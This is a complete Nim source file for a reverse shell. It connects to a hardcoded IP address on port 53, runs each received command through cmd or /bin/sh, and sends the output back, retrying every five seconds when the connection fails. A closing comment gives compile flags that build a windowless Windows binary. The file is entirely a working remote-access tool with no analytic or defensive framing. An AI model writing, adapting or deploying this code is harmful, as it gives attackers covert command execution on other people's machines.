import net
import osproc
import os

var ip = "192.168.136.137" 
var port = 53 

var socket = newSocket()
var finalcommand : string

while true:
    try:
        socket.connect(ip,Port(port)) 
        while true:            
            try:
                socket.send("<nimshell>")
                var command = socket.recvLine() 
                if command == "bye":
                    socket.send("退出 NIM SHELL ")
                    socket.close()
                    system.quit(0)
                if  system.hostOS == "windows":
                    finalcommand = "cmd /C" & command
                else:
                    finalcommand = "/bin/sh -c" & command
                var (cmdres, _) = execCmdEx(finalcommand)
                socket.send(cmdres) 
            except:
                socket.close()
                system.quit(0)
    except:
        echo "连接失败，5秒后尝试"
        sleep(5000)
        continue
        
   #nim c --hints:off --warnings:off -d:danger -d:mingw --app:gui NimSocket.nim
